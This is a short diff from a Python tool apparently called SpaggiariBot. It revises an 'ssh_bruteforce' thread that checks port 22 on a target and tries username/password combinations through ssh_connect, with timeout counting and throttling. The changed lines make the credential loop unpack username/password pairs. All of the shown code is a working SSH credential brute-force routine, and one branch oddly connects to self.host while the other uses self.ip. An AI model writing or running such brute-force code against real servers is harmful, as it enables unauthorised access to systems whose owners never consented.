@@ -266,22 +266,21 @@ class ssh_bruteforce(threading.Thread):
         threading.Thread.__init__(self)
     def run(self):
         if check_port(self.ip, 22):
-            for user in combos.keys():
+            for username,password in combos:
                 if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                     break
                 else:
-                    password = combos[user]
                     if type(password) == tuple:
                         for item in password:
                             if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                                 break
                             else:
-                                result = ssh_connect(self.ip, user, item)
+                                result = ssh_connect(self.ip, username, item)
                                 if   result == 1 : self.timeouts += 1
                                 elif result == 2 : self.timeouts = timeout_breaker
                                 time.sleep(throttle)
                     else:
-                        result = ssh_connect(self.host, user, password)
+                        result = ssh_connect(self.host, username, password)
                         if   result == 1 : self.timeouts += 1
                         elif result == 2 : self.timeouts = timeout_breaker
                         time.sleep(throttle)
